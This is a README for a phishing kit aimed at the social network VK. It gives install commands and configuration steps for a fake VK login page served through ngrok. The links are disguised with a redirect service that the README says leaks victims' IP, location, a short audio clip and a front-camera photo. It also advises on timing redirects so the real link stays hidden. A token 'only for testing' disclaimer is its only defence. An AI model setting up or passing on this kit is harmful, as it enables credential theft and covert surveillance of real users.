# VK Phishing

This tool is ONLY FOR testing. Author is not responsible for all stolen accounts by this tools.


## Installation

``` bash
# install dependencies
npm i

# build for production and launch server
npm run start

# then follow instructions from the console
```
  

## Configuration
  

### Login Page

  

Configuration is stored in `nuxt.config.js`, as the option `vkLogin`. Options (all required):

+  `appName` - VK application name

+  `appLogo` - VK application logo, must be square, recommended size is (50x50)

+  `cancelReturnUrl` - URL, to what user will be redirected, if press cancel button

  

### Ngrok

  

  

Ngrok configuration file is in `config/ngrok.yml`. Supported only global options.

  

Read more at [ngrok docs](https://ngrok.com/docs#config)

  

### Aye Kosmonavt

Read his docs [on github](https://github.com/AlexXanderGrib/aye-kosmonavt-api#readme)

Here it used for hide ngrok links, what often are banned by VK. Also aye-kosmonavt leaks user data, such as ip, port, user-agent, navigator settings, and can leak location, audio (3 sec) and frontal camera photo.

Config stored in `config/aye-kosmonavt.yml`. You can create multiple presets for you convenience and select it by `use` option.

Options used in config (**all required**): 
1. `beforeLoginTitle` - link title what will be displayed in tab title or in social media link preview
2. `beforeLoginImage` - image what will be displayed on redirection page.
3. `beforeLoginSocialImage` - e.g `OgImage`, will be used in social media preview
4. `beforeLoginRedirTime` - time before user will redirected to phishing  (less better, but not 0, because 0 will expose your original link)
5. `afterLoginTitle` - title, of tab, for what user will be redirected after successful authorization (such as all `afterLogin*`)
6. `afterLoginImage` - Background image of tab
7. `afterLoginUrl` - url, to what user will be redirected
8. `afterLoginRedirTime` - time to redirect to `afterLoginUrl`, better is 5-10 secs.